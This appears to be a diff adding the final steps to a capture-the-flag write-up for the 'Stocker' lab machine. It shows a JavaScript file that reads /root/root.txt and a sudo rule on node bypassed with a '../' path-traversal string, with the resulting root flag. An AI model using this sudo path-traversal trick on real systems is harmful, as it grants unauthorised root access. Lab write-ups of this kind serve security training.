@@ -422,6 +422,8 @@ User angoose may run the following commands on stocker:
 After a quick check, we find that `vim` is avaliable to use.
 Simple! Let's try and write some JavaScript to read the root file.
 
+NOTE: To do this, we must be in our `home` directory
+
 ```
 $ vim
 
@@ -438,3 +440,18 @@ fs.readFile('/root/root.txt', 'utf8', (err, data) => {
 :wq hecked.js
 ```
 
+So we have our `hecked.js` file. Now we have to run it. THe problem is, we can only run `sudo` on the `node` command with `.js` files within the `/usr/local/scripts` folder.
+
+Luckily we can work around this security measure!
+
+To run our script, let's do:
+
+```
+$ sudo node '/usr/local/scripts/../../../home/angoose/hecked.js' 
+[sudo] password for angoose: 
+aa30b8235cfa1991931d29096de0dd7c
+```
+
+We got the root flag!
+
+Stocker: Pwned!
